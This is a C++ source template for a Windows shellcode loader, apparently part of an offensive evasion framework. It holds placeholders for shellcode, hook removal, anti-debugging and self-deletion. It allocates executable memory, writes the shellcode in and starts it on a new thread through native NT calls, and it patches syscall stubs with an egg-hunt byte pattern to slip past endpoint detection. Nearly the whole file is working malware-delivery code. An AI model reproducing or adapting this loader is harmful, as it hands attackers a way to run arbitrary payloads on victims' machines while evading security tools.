#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
//####USING####

#pragma comment(lib, "ntdll")

//####DEFINE####

//####CODE####


int Inject()
{
	int length = ####SHELLCODE_LENGTH####;
    unsigned char* encoded = ####SHELLCODE####;

    /*
    int i;
    for (i = 0; i < length; i++)
    {
        if (i > 0) printf(":");
        printf("%02X", encoded[i]);
    }
    printf("\n");
    */

    //####CALL####

    unsigned char* decoded = encoded;

	unsigned long size = 4096;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
	SIZE_T RegionSize = (SIZE_T)length;

	LPVOID allocation_start = nullptr;

    NTSTATUS status;
	HANDLE targetHandle = (HANDLE)((int)-1);
	if (targetHandle == 0){
	    printf("[-] Invalid Target Handle\n");
	    exit(1);
	}
    printf("[*] Allocating virtual memory\n");
	//####DELAY####
    //####UNHOOK####
    status = NtAllocateVirtualMemory(targetHandle, &allocation_start, 0, (PSIZE_T)&RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status < 0){
	    printf("[-] Memory allocation failed\n");
	    exit(1);
	}

    printf("[*] Writing virtual memory at %p\n", allocation_start);
	status = NtWriteVirtualMemory(targetHandle, allocation_start, decoded, length, 0);
    if (status < 0){
	    printf("[-] Memory writing failed\n");
	    exit(1);
	}

//	Sleep(60*1000);


	HANDLE targetThreadHandle = NULL;
    printf("[*] Creating thread\n");
	NtCreateThreadEx(&targetThreadHandle, GENERIC_EXECUTE, NULL, targetHandle, allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL);

//	Sleep(60*1000);

    if (targetThreadHandle == NULL){
	    printf("[-] Invalid Thread Handle\n");
	    exit(1);
	}
    printf("[+] Started Thread\n");
	Sleep(5*1000);

	return 0;
}

int main(int argc, char** argv) {

    // LoadLibrary(L"C:\\Users\\d3adc0de\\Desktop\\Shared\\PenetrationTesting\\Git Personal Projects\\inceptor\\inceptor\\libs\\private\\x64\\syscall-detect.dll");

    // unsigned char egg[] = { 0x77, 0x00, 0x00, 0x74, 0x77, 0x00, 0x00, 0x74 }; // w00tw00t
	// unsigned char replace[] = { 0x0f, 0x05, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC }; // syscall; nop; nop; ret; nop; int3; int3

    unsigned char egg[] = { 0x63, 0x0, 0x0, 0x69, 0x63, 0x0, 0x0, 0x69 }; // egg
    unsigned char replace[] = { 0x0f, 0x34, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC };

	//####SELF_TAMPERING####
	(egg, replace);

    //####ANTIDEBUG####
    //####ARGS####
    //####SELF_DELETE####

	Inject();

    return 0;
}
